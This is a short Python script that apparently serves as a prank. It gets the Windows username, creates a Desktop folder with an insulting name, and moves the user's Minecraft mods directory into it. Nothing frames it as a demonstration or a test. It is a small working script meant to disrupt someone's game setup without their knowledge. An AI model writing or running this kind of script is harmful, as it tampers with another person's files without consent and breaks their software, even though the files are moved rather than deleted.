# imports
import os 

import shutil   

import getpass


username = (getpass.getuser())
print(username)

# stuff

directory = "Lol-Fuck-You"
parent_dir = r"C:\Users\{}\OneDrive\Desktop".format(username)

path = os.path.join(parent_dir, directory)

os.mkdir(path)
print("Directory '% s' created" % directory)

# Source
source = r"C:\Users\{}\AppData\Roaming\.minecraft\mods".format(username)
print(source)
  
# Destination 
destination = r'C:\Users\{}\OneDrive\Desktop\Lol-Fuck-You'.format(username)
  
# This is what it does
dest = shutil.move(source, destination) 
  

